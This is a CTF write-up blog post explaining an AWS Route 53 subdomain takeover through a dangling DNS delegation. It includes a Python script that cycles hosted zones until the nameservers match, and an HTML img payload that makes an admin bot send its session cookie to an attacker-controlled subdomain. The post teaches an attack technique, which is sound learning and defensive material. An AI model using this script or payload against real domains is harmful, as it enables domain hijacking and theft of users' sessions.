---
layout: post
title: Punk Security DevSecOps Birthday CTF Subdomain Takeover (Hard) Challenge Writeup
tags: [ctf, ctf writeup]
---

[Punk Security DevSecOps Birthday CTF](https://punksecurity.co.uk/ctf/2023/)  
[On CTFtime](https://ctftime.org/event/1903)

We did the 12-hour CTF on 4th May 2023. The CTF is unique and primarily focused on DevSecOps, including CI/CD pipelines, cloud etc. It is not in my best expertises, but we had a strong team and managed to full clear all the challenges and won the CTF.

We were one of the only teams solved this subdomain takeover challenge. This solve involves exploiting a dangling delegation DNS record on AWS Route 53 to takeover a subdomain, thus bypass some CSP restrictions.

## The Challenge and Solve

*The notes and screenshots were taken when different challenge instances were running, so several different challenge domains may be in the writeup below.*

### Finding the Dangling Delegation

In the challenge description, it suggested to do a scan of possible subdomain takeover with [dnsReaper](https://github.com/punk-security/dnsReaper) tool made and open sourced by Punk Security.

After the scan, we found a dangling delegation DNS record for zone `dev.[challenge domain]`, as shown in the screenshot below.

![dnsReaper scan result](/assets/image/punk-security-devsecops-birthday-ctf-subdomain-takeover-hard-writeup/dnsReaper.png)

I then created hosted zone on AWS Route 53 for `dev.[challenge domain]` and AWS will randomly assign 4 nameservers for the hosted zone. I used the following script to repeatedly create hosted zone and check the nameservers until I got at least one of the nameservers that the zone is delegated to.

```python
import boto3
import uuid
client = boto3.client('route53')
target_nameservers = 'ns-423.awsdns-52.com,ns-904.awsdns-49.net,ns-1899.awsdns-45.co.uk,ns-1125.awsdns-12.org'
target_nameservers = set(target_nameservers.split(','))
count = 0
while True:
    count += 1
    print(count, end='\r')
    zone = client.create_hosted_zone(
        Name='dev.d9edd91f-c40.ctf.two.dr.punksecurity.cloud',
        CallerReference=str(uuid.uuid4()),
        HostedZoneConfig={
            'PrivateZone': False
        }
    )
    id = zone['HostedZone']['Id']
    nameservers = set(zone['DelegationSet']['NameServers'])
    if len(nameservers & target_nameservers) > 0:
        break
    client.delete_hosted_zone(Id=id)
```

It took only just over 100 attempts to get a nameserver that the zone is delegated to.

### Finding Loopholes on the Web

The web app to be exploited uses CSP to restrict the loading of external scripts. It only allows the script from the same origin. However, the session cookie is set to the domain scope of `.[challenge domain]`, that means when making requests to any subdomains or even sub-subdomains etc, the session cookie will be included.

![Session Cookie](/assets/image/punk-security-devsecops-birthday-ctf-subdomain-takeover-hard-writeup/cookie.png)

The CSP on the web app also allows images from any origin, so we can load images from the subdomain we took over.

With the `dev.[challenge domain]` zone we took over with our own AWS account, we can create a subdomain `takeover.dev.[challenge domain]` and point it to a web server we control.

![Pointing the subdomain to our server on AWS Route 53](/assets/image/punk-security-devsecops-birthday-ctf-subdomain-takeover-hard-writeup/route53.png)

Thus, we I post a comment with the following content, the admin bot will make request to our server with the session cookie.

```html
<img src="http://takeover.dev.[challenge domain]">
```

![The admin bot made request to our server with session cookie](/assets/image/punk-security-devsecops-birthday-ctf-subdomain-takeover-hard-writeup/listen.png)

With the session cookie of the admin bot, we can now make request to the web app with the session cookie and get the flag.

## Notes and Findings during the CTF

In the `results.csv` outputted by dnsReaper, I noticed the link to a [GitHub Issue](https://github.com/punk-security/dnsReaper/issues/122) discussing about some protections on AWS Route 53 against domain takeover because of dangling delegation. In that discussion, there is a link to a [video demo](https://youtu.be/GGfQlPZSRk4?t=712) of the subdomain take over on AWS Route 53 at BSides Newcastle by [SimonGurney](https://github.com/SimonGurney) whom is the author of dnsReaper. Despite not the best recording audio quality, the demo was very helpful to understand this exploit.

Regarding [the protection from dangling delegation records in Route 53](https://docs.aws.amazon.com/Route53/latest/DeveloperGuide/protection-from-dangling-dns.html), when the subdomain hosted zone is removed, the delegation will need to be removed and recreated to delegate the subdomain to a hosted zone. However, if a hosted zone is never created before the delegation, meaning the domain has always been dangling, the protection will not automatically protect against subdomain takeover.
